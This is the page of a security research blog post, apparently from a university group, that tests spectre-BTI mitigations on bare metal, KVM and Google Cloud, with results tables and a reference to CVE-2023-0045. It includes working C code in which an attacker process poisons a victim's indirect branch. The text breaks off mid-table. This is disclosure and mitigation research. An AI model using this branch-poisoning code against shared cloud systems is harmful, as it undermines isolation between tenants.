<!doctype html><html lang=en dir=auto><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Hyperbleed - Current state of spectre-BTI mitigations on cloud | Blog do GRIS</title>
<meta name=keywords content="cpu,spectre,cloud"><meta name=description content="Current state of spectre-BTI mitigations on cloud"><meta name=author content="bsdaemon, esoj"><link rel=canonical href=http://localhost:1313/blog/2023-05-29-hyperbleed-post/><meta name=google-site-verification content="G-YWN8S4BKK0"><link crossorigin=anonymous href=/assets/css/stylesheet.45e028aa8ce0961349adf411b013ee39406be2c0bc80d4ea3fc04555f7f4611a.css integrity="sha256-ReAoqozglhNJrfQRsBPuOUBr4sC8gNTqP8BFVff0YRo=" rel="preload stylesheet" as=style><link rel=icon href=http://localhost:1313/images/gris-logo-2020%27s_black.png><link rel=icon type=image/png sizes=16x16 href=http://localhost:1313/images/gris-logo-2020-black-16x16.png><link rel=icon type=image/png sizes=32x32 href=http://localhost:1313/images/gris-logo-2020-black-32x32.png><link rel=apple-touch-icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=http://localhost:1313/blog/2023-05-29-hyperbleed-post/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css integrity=sha384-MlJdn/WNKDGXveldHDdyRP1R4CTHr3FeuDNfhsLPYrq2t0UBkUdK2jyTnXPEK1NQ crossorigin=anonymous><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js integrity=sha384-VQ8d8WVFw0yHhCk5E8I86oOhv48xLpnDZx5T9GogA/Y84DcCKWXDmSDfn13bzFZY crossorigin=anonymous></script><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js integrity=sha384-+XBljXPPiv+OzfbB3cVmLHf4hdUFHlWNZN5spNQ7rmHTXpd7WvJum6fIACpNNfIR crossorigin=anonymous onload=renderMathInElement(document.body)></script>>
<script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})})</script><meta property="og:url" content="http://localhost:1313/blog/2023-05-29-hyperbleed-post/"><meta property="og:site_name" content="Blog do GRIS"><meta property="og:title" content="Hyperbleed - Current state of spectre-BTI mitigations on cloud"><meta property="og:description" content="Current state of spectre-BTI mitigations on cloud"><meta property="og:locale" content="pt"><meta property="og:type" content="article"><meta property="article:section" content="blog"><meta property="article:published_time" content="2023-05-29T00:00:00+00:00"><meta property="article:modified_time" content="2023-05-29T00:00:00+00:00"><meta property="article:tag" content="Cpu"><meta property="article:tag" content="Spectre"><meta property="article:tag" content="Cloud"><meta property="og:image" content="http://localhost:1313/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="http://localhost:1313/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="Hyperbleed - Current state of spectre-BTI mitigations on cloud"><meta name=twitter:description content="Current state of spectre-BTI mitigations on cloud"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Blogs","item":"http://localhost:1313/blog/"},{"@type":"ListItem","position":2,"name":"Hyperbleed - Current state of spectre-BTI mitigations on cloud","item":"http://localhost:1313/blog/2023-05-29-hyperbleed-post/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Hyperbleed - Current state of spectre-BTI mitigations on cloud","name":"Hyperbleed - Current state of spectre-BTI mitigations on cloud","description":"Current state of spectre-BTI mitigations on cloud","keywords":["cpu","spectre","cloud"],"articleBody":"Version 1.0 Introduction During our tests for reverse spectre attacks 123, we have observed that the behavior of the spectre-BTI4 mitigations differs between a bare-metal and a cloud-based scenario.\nThe Linux kernel allows userspace processes to enable mitigations by calling prctl5 with the PR_GET_SPECULATION_CTRL which disables the speculation feature or by using seccomp6. The default behavior changed over time (from using IBPB/STIBP to IBRS).\nWe have measured that on some instances of Google, AWS, Azure and Oracle, the spectre-BTI mitigation using prctl still leaves the victim exposed to attacks in some cases. In this research, we tested multiple scenarios in an attempt to enumerate the causes of failure for the mitigations.\nNote: The title hyperbleed is just a joke/meme/trolling and a way of internally tracking the bug.\nCurrent Hardware Mitigations (and their software interfaces on the Linux Kernel) The following IA32_SPEC_CTRL and IA32_PRED_CMD Model Specific Registers can be used to mitigate spectre-BTI7:\nAMD CPUs are compatible with those definitions 8. For a complete breakdown on the different mitigations and the recommended usages, refer to Intel’s guidance 9.\nIndirect Branch Restricted Speculation (IBRS) IBRS is a hardware mitigation used to prevent code from a less privileged mode to control branches executed on a more privileged mode 10. This mitigation is used to prevent spectre-BTI attacks against higher privileged security domains, such as kernel or host in the case of a VMM.\nTo enable the mitigation it is necessary to perform a write on a Model Specific Register (IA32_SPEC_CTRL.IBRS = 1, or MSR_72[0]=1) every time a context change happens from an untrusted context.\nIBRS can also be used to mitigate user-level attacks, according to Intel guidance 10:\n1 Additionally, when IA32_SPEC_CTRL.IBRS is set to 1 on any logical processors of that core, the predicted targets of indirect branches cannot be controlled by software that executes (or executed previously) on another logical processor of the same core. Enhanced IBRS eIBRS supports an ‘always on’ mode for the IBRS (so the bit has to be set only once) 10.\nSingle Thread Indirect Branch Predictors (STIBP) STIBP prevents code from controlling branches executed on a sibling thread. STIBP doesn’t restrict previous branches from controlling future branches, therefore an IBPB must also be used.\nIndirect Branch Predictor Barrier (IBPB) The IBPB is used to prevent future branches from being affected by old branches recorded before issuing IBPB. The IBPB isn’t an operation mode but an instruction to clear (flush) the Branch Predictor Unit (BPU). It can be used to prevent untrusted software from controlling each other when executing at the same privilege level and same core. IBPB can be executed on process context switches to mitigate spectre-BTI.\nThe PRCTL syscall with PR_SET_SPECULATION_CTRL option The prctl syscall allows the user to set mitigations for the current process 11. The Linux kernel uses a combination of the previously discussed hardware mitigations to protect user processes against attacks from other user applications 12.\nThe mitigation for spectre-BTI can be enabled with:\nprctl(PR_SET_SPECULATION_CTRL, PR_SPEC_INDIRECT_BRANCH, PR_SPEC_DISABLE, 0, 0);\nSimilarly, the mitigation can be enabled inby using seccomp 136:\nsyscall(SYS_seccomp,SECCOMP_SET_MODE_STRICT,0,0);\nTest Code The test consists of two processes. The attacker constantly poisons an indirect call to speculatively redirect it to a target address. The victim process measures the mispredict rate and tries to mitigate the attack either by calling PRCTL or writing to the MSR directly using a kernel module that exposes MSR read and write operations to userspace.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 /* gcc -o victim test.c -O0 -masm=intel -w -DVICTIM gcc -o victim-PRCTL test.c -O0 -masm=intel -w -DVICTIM -DPRCTL gcc -o victim-nospecctrl test.c -O0 -masm=intel -w -DVICTIM -DMSR -DMSR_VAL=0 gcc -o victim-IBRS test.c -O0 -masm=intel -w -DVICTIM -DMSR -DMSR_VAL=1 gcc -o victim-STIBP test.c -O0 -masm=intel -w -DVICTIM -DMSR -DMSR_VAL=2 gcc -o victim-IBPB test.c -O0 -masm=intel -w -DVICTIM -DMSR -DMSR_VAL=0 -DIBPB gcc -o attacker test.c -O0 -masm=intel -w */ #include \"utils.h\" #include #include #include #ifndef PRINT_AMMOUNT #define PRINT_AMMOUNT 1000 #endif #define IA32_SPEC_CTRL 72 uint8_t *rdiPtr; uint8_t unused[0x500]; uint8_t probeArray[0x1000] = {2}; uint8_t unuse2[0x500]; uint32_t f1() {} int poison(uint8_t *srcAddress, uint8_t *dstAddress, uint64_t cpu) { volatile uint8_t d; unsigned tries = 0; unsigned hits = 0; unsigned totalHits = 0; unsigned totalTries = 0; jitForLoop(srcAddress); while (1) { #ifndef VICTIM callGadget(srcAddress, (uint8_t *)\u0026rdiPtr, (uint8_t *)probeArray); continue; #else #ifdef IBPB wrmsr_on_cpu(73, cpu, 1); #endif for (int i = 0; i \u003c 100; i++) { d = *dstAddress; flush((uint8_t *)\u0026rdiPtr); callGadget(srcAddress, (uint8_t *)\u0026rdiPtr, (uint8_t *)probeArray); } if (probe(\u0026probeArray[0]) \u003c THRESHOLD) { hits++; totalHits++; } totalTries++; if (++tries % PRINT_AMMOUNT == 0) { printf(\"Rate: %u/%u MSR[72]=%d\\n\", hits, tries,rdmsr_on_cpu(IA32_SPEC_CTRL,cpu)); #ifdef MSR wrmsr_on_cpu(IA32_SPEC_CTRL, cpu, MSR_VAL); #endif tries = 0; hits = 0; if (totalTries \u003e= PRINT_AMMOUNT * 10) { break; } } usleep(1); #endif } printf(\"Total misspredict rate: %d/%d (%.2f %)\\n\", totalHits, totalTries, (float)totalHits * 100 / (float)totalTries); } int main(int argc, char **argv) { uint64_t srcAddress; uint64_t dstAddress; uint64_t cpu; if (argc \u003c 4) { printf(\"Usage: %s \\n\", argv[0]); printf(\"Example: %s 0x55555554123 0x55555555345 1 \\n\", argv[0]); return 0; } srcAddress = (uint64_t)strtoull(argv[1], NULL, 16); dstAddress = (uint64_t)strtoull(argv[2], NULL, 16); cpu = (uint64_t)strtoull(argv[3], NULL, 16); SetCoreAffinity(cpu); uint8_t *rwx1 = requestMem((uint8_t *)(srcAddress \u0026 (~0xfffULL)), 0x1000); uint8_t *rwx2 = requestMem((uint8_t *)(dstAddress \u0026 (~0xfffULL)), 0x1000); #ifdef PRCTL if (prctl(PR_SET_SPECULATION_CTRL, PR_SPEC_INDIRECT_BRANCH, PR_SPEC_FORCE_DISABLE, 0, 0) != 0) { perror(\"prctl\"); } printf(\"PRCTL GET value 0x%x\\n\", prctl(PR_GET_SPECULATION_CTRL, PR_SPEC_INDIRECT_BRANCH, 0, 0, 0)); #endif #ifdef MSR printf(\"current value msr[%d]=%d on core %d\\n\", IA32_SPEC_CTRL, rdmsr_on_cpu(IA32_SPEC_CTRL, cpu), cpu); wrmsr_on_cpu(IA32_SPEC_CTRL, cpu, MSR_VAL); printf(\"writing msr[%d]=%d on core %d \\n\", IA32_SPEC_CTRL, MSR_VAL, cpu); printf(\"current value msr[%d]=%d on core %d\\n\", IA32_SPEC_CTRL, rdmsr_on_cpu(IA32_SPEC_CTRL, cpu), cpu); #endif // set up leak gadget into position #ifdef VICTIM rdiPtr = (uint8_t *)f1; copyLeakGadget(dstAddress); #else rdiPtr = (uint8_t *)dstAddress; copyRetGadget(dstAddress); #endif poison(srcAddress, dstAddress, cpu); #ifdef MSR printf(\"current value msr[%d]=%d on core %d\\n\", IA32_SPEC_CTRL, rdmsr_on_cpu(IA32_SPEC_CTRL, cpu), cpu); #endif } Disclaimer We have identified that the test code sometimes might produce false negatives (low misprediction rate). Retrying the execution can lead to greater misprediction rate values, indicating the vulnerability.\nControl Test Setup (Bare Metal) We used the spectre_meltdown_checker14 to verify the spectre v2 mitigations available for the machine used as control:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 $ sudo ./spectre-meltdown-checker.sh Spectre and Meltdown mitigation detection tool v0.45 Checking for vulnerabilities on current system Kernel is Linux 5.15.0-56-generic #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64 CPU is Intel(R) Core(TM) i7-4790 CPU @ 3.60GHz Hardware check * Hardware support (CPU microcode) for mitigation techniques * Indirect Branch Restricted Speculation (IBRS) * SPEC_CTRL MSR is available: YES * CPU indicates IBRS capability: YES (SPEC_CTRL feature bit) * Indirect Branch Prediction Barrier (IBPB) * CPU indicates IBPB capability: YES (SPEC_CTRL feature bit) * Single Thread Indirect Branch Predictors (STIBP) * SPEC_CTRL MSR is available: YES * CPU indicates STIBP capability: YES (Intel STIBP feature bit) [...] * CPU vulnerability to the speculative execution attack variants * Affected by CVE-2017-5753 (Spectre Variant 1, bounds check bypass): YES * Affected by CVE-2017-5715 (Spectre Variant 2, branch target injection): YES [...] CVE-2017-5715 aka 'Spectre Variant 2, branch target injection' * Mitigated according to the /sys interface: YES (Mitigation: Retpolines, IBPB: conditional, IBRS_FW, STIBP: conditional, RSB filling, PBRSB-eIBRS: Not affected) * Mitigation 1 * Kernel is compiled with IBRS support: YES * IBRS enabled and active: YES (for firmware code only) * Kernel is compiled with IBPB support: YES * IBPB enabled and active: YES * Mitigation 2 * Kernel has branch predictor hardening (arm): NO * Kernel compiled with retpoline option: YES * Kernel compiled with a retpoline-aware compiler: YES (kernel reports full retpoline compilation) \u003e STATUS: NOT VULNERABLE (Full retpoline + IBPB are mitigating the vulnerability) [...] \u003e SUMMARY: CVE-2017-5753:OK CVE-2017-5715:OK CVE-2017-5754:OK CVE-2018-3640:OK CVE-2018-3639:OK CVE-2018-3615:OK CVE-2018-3620:OK CVE-2018-3646:OK CVE-2018-12126:OK CVE-2018-12130:OK CVE-2018-12127:OK CVE-2019-11091:OK CVE-2019-11135:OK CVE-2018-12207:OK CVE-2020-0543:OK This shows that the CPU has support for IBRS, IBPB and STIBP.\nAll the executed tests run the attacker process on core 0. The arguments 0x55555554123 and 0x55555555345 are just the source and the destination of the branch and are the same for the victim and the attacker. The third argument is the core to be pinned.\nThe MSR module (from msr-tools) must be loaded too.\n1 2 $ ./attacker 0x55555554123 0x55555555345 0 \u0026 $ sudo modprobe msr For the mitigation test using the IA32_SPEC_CTRL MSR, we write the desired value to the register and check if the written value stays the same until the remainder of the test, otherwise the result is discarded. Sometimes the kernel may overwrite the value on the MSR, thus disabling the mitigation, but writing to the MSR before every branch disrupts the test flow and yields wrong results.\nExample of a false positive:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 Testing victim-IBRS on core 0: current value msr[72]=0 on core 0 writing msr[72]=1 on core 0 current value msr[72]=1 on core 0 Rate: 0/1000 MSR[72]=1 Rate: 0/1000 MSR[72]=1 Rate: 667/1000 MSR[72]=0 //this bin should be discarded Rate: 0/1000 MSR[72]=1 Rate: 0/1000 MSR[72]=1 Rate: 0/1000 MSR[72]=1 Rate: 0/1000 MSR[72]=1 Rate: 0/1000 MSR[72]=1 Rate: 0/1000 MSR[72]=1 Rate: 0/1000 MSR[72]=1 Total misspredict rate: 667/10000 (6.67 %) //actual misspredict rate = 0% (0/9000) current value msr[72]=1 on core 0 No mitigation Then we execute the victim code on either core 0 or its sibling thread (core 4 in this case). For the control victim code the results are:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 Testing victim on core 0: Rate: 998/1000 MSR[72]=0 Rate: 997/1000 MSR[72]=0 Rate: 1000/1000 MSR[72]=0 Rate: 999/1000 MSR[72]=0 Rate: 1000/1000 MSR[72]=0 Rate: 1000/1000 MSR[72]=0 Rate: 1000/1000 MSR[72]=0 Rate: 1000/1000 MSR[72]=0 Rate: 1000/1000 MSR[72]=0 Rate: 1000/1000 MSR[72]=0 Total mispredict rate: 9994/10000 (99.94 %) real\t0m0,695s user\t0m0,174s sys\t0m0,000s Testing victim on core 4: Rate: 1000/1000 MSR[72]=0 Rate: 1000/1000 MSR[72]=0 Rate: 1000/1000 MSR[72]=0 Rate: 1000/1000 MSR[72]=0 Rate: 1000/1000 MSR[72]=0 Rate: 1000/1000 MSR[72]=0 Rate: 1000/1000 MSR[72]=0 Rate: 1000/1000 MSR[72]=0 Rate: 1000/1000 MSR[72]=0 Rate: 1000/1000 MSR[72]=0 Total mispredict rate: 10000/10000 (100.00 %) real\t0m0,744s user\t0m0,235s sys\t0m0,000s In this case, we observed a misprediction rate of 95%+, indicating that the attacker process can poison the victim branch.\nDisabling the (in this case, the control, it was already disabled) mitigations using the MSR (obviously) returns similar results:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 Testing victim-nospecctrl on core 0: current value msr[72]=0 on core 0 writing msr[72]=0 on core 0 current value msr[72]=0 on core 0 Rate: 1000/1000 MSR[72]=0 [...] Total misspredict rate: 9999/10000 (99.99 %) current value msr[72]=0 on core 0 real\t0m0,691s user\t0m0,168s sys\t0m0,000s Testing victim-nospecctrl on core 4: current value msr[72]=0 on core 4 writing msr[72]=0 on core 4 current value msr[72]=0 on core 4 Rate: 998/1000 MSR[72]=0 [...] Total misspredict rate: 9988/10000 (99.88 %) current value msr[72]=0 on core 4 real\t0m0,746s user\t0m0,234s sys\t0m0,000s IBRS By using the msr-tools, we are able to write to the IA32_SPEC_CTRL MSR by writing to the file /dev/cpu//msr. We have used Haswell CPU for the control test, in which by setting IBRS=1 mitigates all different spectre-BTI scenarios:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 Testing victim-IBRS on core 0: current value msr[72]=0 on core 0 writing msr[72]=1 on core 0 current value msr[72]=1 on core 0 [...] Total misspredict rate: 0/10000 (0.00 %) current value msr[72]=1 on core 0 real\t0m1,713s user\t0m0,731s sys\t0m0,094s Testing victim-IBRS on core 4: current value msr[72]=0 on core 4 writing msr[72]=1 on core 4 current value msr[72]=1 on core 4 [...] Total mispredict rate: 0/10000 (0.00 %) current value msr[72]=1 on core 4 real\t0m1,536s user\t0m0,984s sys\t0m0,037s For the IBRS tests, it’s also possible to note a drastic performance decrease, from ~0.7s to ~1.5 seconds for both CPU threads; this indicates that probably speculative execution is disabled when IBRS is enabled. Commenting the line that flushes the target value for the branch improves the result, implying that the CPU spent less time on stalls in the pipeline:\n1 2 3 4 5 6 7 8 $ time sudo ./victim-IBRS 0x55555554123 0x55555555345 4 [...] Total misspredict rate: 0/10000 (0.00 %) current value msr[72]=0 on core 4 real 0m1,050s user 0m0,005s sys 0m0,005s STIBP STIBP aims to mitigate only speculation between sibling threads so it’s expected to not mitigate attacks running on the same core:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 Testing victim-STIBP on core 0: current value msr[72]=1 on core 0 writing msr[72]=2 on core 0 current value msr[72]=2 on core 0 [...] Total misspredict rate: 6198/10000 (61.98 %) current value msr[72]=2 on core 0 real\t0m1,102s user\t0m0,434s sys\t0m0,000s Testing victim-STIBP on core 4: current value msr[72]=0 on core 4 writing msr[72]=2 on core 4 current value msr[72]=2 on core 4 [...] Total misspredict rate: 0/10000 (0.00 %) current value msr[72]=2 on core 4 real\t0m0,744s user\t0m0,227s sys\t0m0,006s IBPB In our tests with IBPB, before every sequence of 100 branches an IBPB is issued.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 Testing victim-IBPB on core 0: current value msr[72]=2 on core 0 writing msr[72]=0 on core 0 current value msr[72]=0 on core 0 [...] Total misspredict rate: 0/10000 (0.00 %) current value msr[72]=0 on core 0 real\t0m0,784s user\t0m0,259s sys\t0m0,000s Testing victim-IBPB on core 4: current value msr[72]=2 on core 4 writing msr[72]=0 on core 4 current value msr[72]=0 on core 4 [...] Total misspredict rate: 14/10000 (0.14 %) current value msr[72]=0 on core 4 real\t0m0,838s user\t0m0,248s sys\t0m0,074s In the SMT scenario, it’s possible to observe some traces of speculation happening. This result is expected since after the flush of the BPU, thread 0 immediately executes a branch poisoning the BTB. However, due to the high frequency of IBPB’s in this test, it drastically reduces the speculation rate on the sibling thread. The Linux Kernel, when mitigating user-user branch injection attacks, only issues the IBPB on context switches and the sibling thread case is mitigated by STIBP (as recommended by Intel). Since we did not ensure such rigorous execution flow control when testing on usermode (we could have added synchronization but it was really not necessary for what we wanted to test), it’s not possible to be sure that an attacker thread wouldn’t be scheduled between a victim IBPB and a victim branch so this test may lead to some false positives, however, the results seem accurate enough.\nPRCTL As previously mentioned, the PRCTL syscall allows setting the speculative control for a given process 5. The following call can be used to mitigate spectre-BTI attacks against an user process:\n1 prctl(PR_SET_SPECULATION_CTRL, PR_SPEC_INDIRECT_BRANCH, PR_SPEC_FORCE_DISABLE, 0, 0); The Linux kernel uses a combination of the previous hardware mitigations (STIBP+IBPB) to protect the process from spectre-BTI attacks. This is expected to fully protect the victim:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 Testing victim-PRCTL on core 0: PRCTL GET value 0x9 Rate: 0/1000 MSR[72]=2 [...] Rate: 0/1000 MSR[72]=2 Total misspredict rate: 0/10000 (0.00 %) real\t0m0,744s user\t0m0,200s sys\t0m0,022s Testing victim-PRCTL on core 4: PRCTL GET value 0x9 Rate: 0/1000 MSR[72]=2 [...] Rate: 0/1000 MSR[72]=2 Total misspredict rate: 0/10000 (0.00 %) real\t0m0,744s user\t0m0,222s sys\t0m0,013s Conclusion Table: Ubuntu 22.04.1 LTS:\nKernel is Linux 5.15.0-56-generic #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64\nCPU is Intel(R) Core(TM) i7-4790 CPU @ 3.60GHz\nResults for Control Test Setup (Bare Metal): Mitigation Same Core SMT Expected? No mitigation 99.99 % 99.88 % Yes IBRS 0.00 % 0.00 % Yes STIBP 61.98 % 0.00 % Yes IBPB 0.00 % 0.14 % Yes PRCTL 0.00 % 0.00 % Yes CVE 2023-0045 Bypassing Spectre-BTI User Space Mitigations on Linux 15 In some tests it was detected traces of speculative execution when using PRCTL as mitigation and seting the attacker on the same core. Further research explaned this behaviour due a Kernel bug. Previous implementation of the mitigation only marks the process as protected and dont issue the IBPB during the syscall. this leaves the process unprotected until the next schedule, thus allowing the process to execute for a short period using values already present on the BTB.\nTests on KVM In the same Bare Metal machine, we set up a KVM virtual machine with an ubuntu 22.04.5 image:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 $ virt-install -n ubuntu22 --ram=1024 --vcpus=2 --disk bus=virtio,size=10 --graphics none --location=/var/lib/libvirt/images/ubuntu-22.04.1-live-server-amd64.iso --extra-args='console=ttyS0' //The 2 vcpus are pinned to siblings on the host machine: $ virsh vcpuinfo ubuntutest22 VCPU: 0 CPU: 0 State: running CPU time: 17,9s CPU Affinity: y------- VCPU: 1 CPU: 4 State: running CPU time: 11,9s CPU Affinity: ----y--- The spectre-meltdown checker output:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 Checking for vulnerabilities on current system Kernel is Linux 5.15.0-56-generic #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64 CPU is Intel(R) Core(TM) i7-4790 CPU @ 3.60GHz Hardware check * Hardware support (CPU microcode) for mitigation techniques * Indirect Branch Restricted Speculation (IBRS) * SPEC_CTRL MSR is available: YES * CPU indicates IBRS capability: YES (SPEC_CTRL feature bit) * Indirect Branch Prediction Barrier (IBPB) * CPU indicates IBPB capability: YES (SPEC_CTRL feature bit) * Single Thread Indirect Branch Predictors (STIBP) * SPEC_CTRL MSR is available: YES * CPU indicates STIBP capability: YES (Intel STIBP feature bit) [...] CVE-2017-5715 aka 'Spectre Variant 2, branch target injection' * Mitigated according to the /sys interface: YES (Mitigation: Retpolines, IBPB: conditional, IBRS_FW, STIBP: disabled, RSB filling, PBRSB-eIBRS: Not affected) * Mitigation 1 * Kernel is compiled with IBRS support: YES * IBRS enabled and active: YES (for firmware code only) * Kernel is compiled with IBPB support: YES * IBPB enabled and active: YES * Mitigation 2 * Kernel has branch predictor hardening (arm): NO * Kernel compiled with retpoline option: YES * Kernel compiled with a retpoline-aware compiler: YES (kernel reports full retpoline compilation) \u003e STATUS: NOT VULNERABLE (Full retpoline + IBPB are mitigating the vulnerability) Results for baremetal-kvm: Mitigation NOSMT SMT Expected? No mitigation 99.95 % 99.99 % Yes IBRS 0.00 % 0.00 % Yes STIBP 99.98 % 0.01 % Yes IBPB 0.00 % 98.68 % Yes PRCTL 0.01 % 99.98 % No The tests showed something unexpected: all mitigations worked properly when tested individually, but the prctl is not setting the STIBP MSR like it does when executed in the host, leaving it vulnerable to SMT attacks:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 Testing victim-STIBP on core 1: current value msr[72]=1 on core 1 writing msr[72]=2 on core 1 current value msr[72]=2 on core 1 Rate: 1/1000 MSR[72]=2 -\u003e CVE 2023-0045 trace Rate: 0/1000 MSR[72]=2 Rate: 0/1000 MSR[72]=2 Rate: 0/1000 MSR[72]=2 Rate: 0/1000 MSR[72]=2 Rate: 0/1000 MSR[72]=2 Rate: 0/1000 MSR[72]=2 Rate: 0/1000 MSR[72]=2 Rate: 0/1000 MSR[72]=2 Rate: 0/1000 MSR[72]=2 Total misspredict rate: 1/10000 (0.01 %) current value msr[72]=2 on core 1 [...] Testing victim-PRCTL on core 1: PRCTL GET value 0x9 Rate: 1000/1000 MSR[72]=0 Rate: 999/1000 MSR[72]=0 Rate: 1000/1000 MSR[72]=0 Rate: 1000/1000 MSR[72]=0 Rate: 1000/1000 MSR[72]=0 Rate: 999/1000 MSR[72]=0 Rate: 1000/1000 MSR[72]=0 Rate: 1000/1000 MSR[72]=0 Rate: 1000/1000 MSR[72]=0 Rate: 1000/1000 MSR[72]=0 Total misspredict rate: 9998/10000 (99.98 %) The PRCTL syscall on this kernel fails to mitigate SMT BTI attacks inside the default KVM. Further investigation showed that in this case, besides KVM allowing proper MSR writes, the Linux kernel only implements the STIBP mitigation if the processor is executing in SMT (which makes sense on a Bare Metal system):\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 static __always_inline void __speculation_ctrl_update(unsigned long tifp, unsigned long tifn) { [...] /* Only evaluate TIF_SPEC_IB if conditional STIBP is enabled. */ if (IS_ENABLED(CONFIG_SMP) \u0026\u0026 static_branch_unlikely(\u0026switch_to_cond_stibp)) { updmsr |= !!(tif_diff \u0026 _TIF_SPEC_IB); msr |= stibp_tif_to_spec_ctrl(tifn); } if (updmsr) write_spec_ctrl_current(msr, false); } Even though both cores are siblings on the host, the guest OS believes they are not siblings (due to how the hypervisor exposes the hardware) and therefore STIBP is not necessary. This explains why MSR[72]=0 during the prctl mitigation. Reading /sys/devices/system/cpu/cpu0/topology/thread_siblings_list on guest shows that there is only one sibling core:\n0\nversus 2 on the guest:\n0,4\nTests on google cloud Results for gcp-n1-standard-2-Intel_Haswell: Google cloud shows that mitigations are available for spectre-BTI:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 Checking for vulnerabilities on current system Kernel is Linux 5.15.0-1025-gcp #32-Ubuntu SMP Wed Nov 23 21:46:01 UTC 2022 x86_64 CPU is Intel(R) Xeon(R) CPU @ 2.30GHz Hardware check * Hardware support (CPU microcode) for mitigation techniques * Indirect Branch Restricted Speculation (IBRS) * SPEC_CTRL MSR is available: YES * CPU indicates IBRS capability: YES (SPEC_CTRL feature bit) * Indirect Branch Prediction Barrier (IBPB) * CPU indicates IBPB capability: YES (SPEC_CTRL feature bit) * Single Thread Indirect Branch Predictors (STIBP) * SPEC_CTRL MSR is available: YES * CPU indicates STIBP capability: YES (Intel STIBP feature bit) Google cloud output shows some different results than the ones observed in bare metal and KVM: It’s never possible to write another value other than 1 to IA32_SPEC_CTRL.\n1 2 3 4 5 6 7 8 9 10 11 12 Testing victim-nospecctrl on core 0: current value msr[72]=1 on core 0 writing msr[72]=0 on core 0 current value msr[72]=1 on core 0 [...] Rate: 1000/1000 MSR[72]=1 Total misspredict rate: 9979/10000 (99.79 %) current value msr[72]=1 on core 0 real\t0m0.879s user\t0m0.267s sys\t0m0.082s This behavior is odd. Because the IA32_SPEC_CTRL is set (IBRS), but speculation still happens, and there isn’t an overhead associated with disabling the speculation:\n1 2 3 4 5 6 7 8 9 10 11 12 Testing victim-IBRS on core 0: current value msr[72]=1 on core 0 writing msr[72]=1 on core 0 current value msr[72]=1 on core 0 Rate: 995/1000 MSR[72]=1 [...] Total misspredict rate: 9945/10000 (99.45 %) current value msr[72]=1 on core 0 real\t0m0.877s user\t0m0.332s sys\t0m0.017s The time here for finishing the task is 0.877s, similar to the 0.7s on bare metal and shorter than the 1.5s for IBRS on bare metal, with Haswell CPUs. That might indicate that the hypervisor is reporting a value that is not really set in the MSR.\nSince it´s not possible to enable STIBP, PRCTL is expected to fail on the sibling attack, even if prctl doesn’t throw an error:\n1 2 3 4 Testing victim-PRCTL on core 1: PRCTL GET value 0x9 [...] Total misspredict rate: 9920/10000 (99.20 %) Mitigation NOSMT SMT Expected? No mitigation 99.79 % 99.90 % Yes IBRS 99.45 % 0.01 % (1) No STIBP 90.47 % 87.62 % No IBPB 99.78 % 0.01 